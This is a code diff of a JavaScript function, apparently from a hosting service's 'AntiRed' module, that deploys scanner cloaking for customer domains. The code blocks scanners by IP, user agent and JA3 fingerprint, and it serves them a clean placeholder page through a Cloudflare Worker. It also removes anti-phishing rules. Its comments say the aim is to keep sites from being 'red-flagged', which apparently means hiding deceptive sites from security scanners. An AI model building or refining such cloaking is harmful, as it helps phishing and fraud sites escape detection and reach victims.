@@ -1861,11 +1861,8 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
   // 1. Deploy .htaccess scanner IP cloaking + UA blocking (all plans)
   results.htaccess = await deployHtaccess(cpUsername, domain)
 
-  // 2. Deploy JS Challenge via .user.ini + static site wrapper if needed (all plans)
-  const jsResult = await deployJSChallenge(cpUsername)
-  results.jsChallenge = jsResult
-
-  // 3. Deploy Cloudflare-level protections
+  // 2. Deploy Cloudflare-level protections FIRST (determines if Worker is active)
+  let workerActive = false
   try {
     const cfService = require('./cf-service')
     const zone = await cfService.getZoneByName(domain)
@@ -1874,8 +1871,6 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
       results.ja3Rules = await createJA3Rules(zone.id)
 
       // 3b. REMOVE old anti-phishing blocking rules (we use content cloaking now)
-      // Old approach: Block scanners with 403 (gets sites red-flagged)
-      // New approach: Show clean placeholder (prevents red-flagging)
       try {
         const rules = await cfService.listFirewallRules(zone.id)
         const antiPhishRule = rules.find(r => 
@@ -1902,8 +1897,7 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
       }
       await cfService.createAntiBotRules(zone.id)
 
-      // 3d. Ensure shared Worker script is up-to-date (includes honeypot + KV binding)
-      // Must be called BEFORE deploying routes so routes point to the latest worker version
+      // 3d. Ensure shared Worker script is up-to-date
       try {
         const workerUpgrade = await upgradeSharedWorker()
         log(`[AntiRed] Worker script updated before route deploy: ${workerUpgrade.success ? 'OK' : 'FAIL'} (KV: ${workerUpgrade.kvBound || false})`)
@@ -1911,8 +1905,9 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
         log(`[AntiRed] Worker script update warning (non-blocking): ${wUpErr.message}`)
       }
 
-      // 3e. Deploy HARDENED shared Worker routes with content cloaking (scanners see clean placeholder)
+      // 3e. Deploy HARDENED shared Worker routes with content cloaking
       results.hardenedWorker = await deploySharedWorkerRoute(domain, zone.id)
+      workerActive = results.hardenedWorker?.success || false
       
       log(`[AntiRed] ✅ Hardened worker deployed for ${domain} - scanners will see clean placeholder`)
     } else {
@@ -1925,6 +1920,19 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
     results.ja3Rules = { success: false, error: err.message }
     results.hardenedWorker = { success: false, error: err.message }
     results.cleanupWAF = { success: false, error: err.message }
+  }
+
+  // 2. Deploy PHP prepend based on Worker status
+  if (workerActive) {
+    // CF Worker handles bot detection → deploy lightweight IP-fix only
+    // This prevents: blank pages, HTML corruption, conflicts with user's PHP anti-bot code
+    results.jsChallenge = await deployCFIPFix(cpUsername)
+    log(`[AntiRed] Worker active for ${domain} → deployed IP-fix prepend (no JS challenge needed)`)
+  } else {
+    // No Worker → fall back to JS Challenge for bot detection
+    const jsResult = await deployJSChallenge(cpUsername)
+    results.jsChallenge = jsResult
+    log(`[AntiRed] No Worker for ${domain} → deployed JS Challenge as fallback`)
   }
 
   log(`[AntiRed] Hardened protection deployed for ${domain}: htaccess=${results.htaccess.success}, js=${results.jsChallenge.success}, ja3=${results.ja3Rules.success}, worker=${results.hardenedWorker?.success}, wafCleanup=${results.cleanupWAF.success}`)
